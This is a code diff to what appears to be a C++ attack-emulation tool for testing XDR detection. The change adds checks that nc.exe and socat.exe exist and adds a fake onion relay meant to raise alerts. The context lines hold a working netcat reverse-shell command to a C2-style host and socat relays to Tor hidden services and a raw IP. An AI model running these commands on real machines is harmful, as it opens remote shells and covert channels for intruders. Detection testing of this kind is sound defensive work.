@@ -2137,7 +2137,8 @@ public:
             "malware-c2.dynamic.io:443",      // Suspicious domain
             "192.168.1.1:445",                // Internal SMB scan
             "10.0.0.1:3389",                  // Internal RDP scan
-            "3g2upl4pq3kufc4m.onion:80"       // TOR hidden service
+            "3g2upl4pq3kufc4m.onion:80",      // TOR hidden service
+            "fakec2trigger.onion:9999"        // Fake TOR domain to trigger alert
         };
 
         std::string ncMD5 = getFileHash(ncPath, "MD5");
@@ -2192,8 +2193,16 @@ public:
 
             std::this_thread::sleep_for(std::chrono::milliseconds(300));
         }
-        
+
         // Create reverse shell process
+        // Double-check nc.exe still exists before attempting reverse shell
+        if (GetFileAttributesA(ncPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
+            sendResponse("NETCAT:NOT_FOUND");
+            logActivity("*** XDR_ALERT ***", "NETCAT_NOT_FOUND",
+                       "nc.exe missing before reverse shell - skipping");
+            return;
+        }
+
         std::string reverseCmd = "C:\\Windows\\Temp\\nc.exe -e cmd.exe malware-c2.dynamic.io 4444";
         STARTUPINFOA si = {0};
         PROCESS_INFORMATION pi = {0};
@@ -2248,14 +2257,23 @@ public:
                            "Socat tool downloaded to C:\\Windows\\Temp\\socat.exe");
             }
         }
-        
+
+        // Ensure socat exists before attempting relays
+        if (GetFileAttributesA(socatPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
+            sendResponse("SOCAT:NOT_FOUND");
+            logActivity("*** XDR_ALERT ***", "SOCAT_NOT_FOUND",
+                       "socat.exe missing - skipping execution");
+            return;
+        }
+
         // Create real socat relay processes
         std::vector<std::pair<std::string, std::string>> relays = {
             {"TCP4-LISTEN:8888,fork", "TCP4:torproject.org:9050"},
             {"TCP4-LISTEN:9999,fork", "TCP4:3g2upl4pq3kufc4m.onion:80"},
             {"TCP4-LISTEN:7777,fork", "TCP4:malware-c2.dynamic.io:443"},
             {"TCP4-LISTEN:6666,fork", "TCP4:45.142.114.231:80"},
-            {"TCP4-LISTEN:5555,fork", "SOCKS4:127.0.0.1:192.168.1.1:445,socksport=9050"}
+            {"TCP4-LISTEN:5555,fork", "SOCKS4:127.0.0.1:192.168.1.1:445,socksport=9050"},
+            {"TCP4-LISTEN:4444,fork", "TCP4:fakec2trigger.onion:9999"} // Fake TOR domain to trigger alert
         };
 
         std::string socatMD5 = getFileHash(socatPath, "MD5");
